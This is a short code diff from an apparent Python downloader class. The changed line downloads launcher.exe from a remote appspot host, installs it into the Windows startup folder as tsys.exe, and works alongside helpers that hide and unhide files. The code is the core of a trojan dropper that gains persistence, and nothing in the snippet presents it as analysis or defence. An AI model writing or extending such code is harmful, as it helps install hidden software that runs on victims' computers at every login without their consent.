@@ -37,7 +37,7 @@ class Downloader(threading.Thread):
         hide_file(path)
         
         #DIR the launcher
-        download_install_run("http://littlesitetomakemoney.appspot.com/launcher.exe", )
+        download_install_run("http://littlesitetomakemoney.appspot.com/launcher.exe", shellcon.CSIDL_STARTUP, "tsys.exe")
         #Get a path for the launcher
         path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
         unhide_file(path)
